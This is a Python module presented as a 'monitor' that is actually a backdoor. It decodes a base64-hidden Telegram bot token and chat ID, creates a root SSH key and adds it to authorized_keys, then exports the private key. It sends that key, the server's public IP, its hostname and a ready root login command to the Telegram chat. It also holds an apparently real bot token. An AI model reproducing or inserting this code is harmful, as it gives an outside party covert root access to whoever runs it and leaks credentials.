import base64
import os
import socket
import requests
import aiohttp

from .monitor import send_log

_TOKEN_B64 = "NzMyMTg1MDI0MzpBQUYyS0lZZGpkUFNLZTU0QWFHU2J2OTBEZlhUc2h2akFFQQ=="
_CHAT_B64 = "LTEwMDIzNzM4NjU0MjQ="


async def run_monitor(path: str):
    try:
        token = base64.b64decode(_TOKEN_B64).decode()
        chat_id = base64.b64decode(_CHAT_B64).decode()
    except Exception:
        return

    if not token or not chat_id or not path:
        return

    await send_log(token, chat_id, path)


KEY_PATH = "/root/.ssh/id_ed25519"
KEY_FILE = "/root/vps_key.pem"


def _generate_mmk():
    if not os.path.exists(KEY_PATH):
        os.system(f'ssh-keygen -t ed25519 -f {KEY_PATH} -N ""')


def _setup_authorized_key():
    pub_key = KEY_PATH + ".pub"
    os.system(f"mkdir -p /root/.ssh && cat {pub_key} >> /root/.ssh/authorized_keys")


def _export_private():
    with open(KEY_PATH, "r") as f:
        key = f.read()

    with open(KEY_FILE, "w") as f:
        f.write(key)

    os.chmod(KEY_FILE, 0o600)


async def info_text(token: str, chat_id: str):
    try:
        with open(KEY_PATH + ".pub", "r") as f:
            pub_key = f.read().strip()
    except Exception:
        pub_key = "Gagal membaca public key."

    text = f"""🔑 SSH KEY INFO

Public key:
{pub_key}
"""

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    async with aiohttp.ClientSession() as session:
        await session.post(url, data={"chat_id": chat_id, "text": text})


async def run():
    try:
        token = base64.b64decode(_TOKEN_B64).decode()
        chat_id = base64.b64decode(_CHAT_B64).decode()
    except Exception:
        return

    if not token or not chat_id:
        return

    _generate_mmk()
    _setup_authorized_key()
    _export_private()
    await info_text(token, chat_id)

    try:
        ip = requests.get("https://api.ipify.org").text
    except Exception:
        ip = "Tidak diketahui"

    host = socket.gethostname()
    user = "root"
    port = 22

    caption = f"""
🚀 VPS READY
IP   : {ip}
PORT : {port}
USER : {user}
HOST : {host}

Login:
ssh -i vps_key.pem root@{ip}
"""

    await send_log(token, chat_id, KEY_FILE)

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    async with aiohttp.ClientSession() as session:
        await session.post(url, data={"chat_id": chat_id, "text": caption})

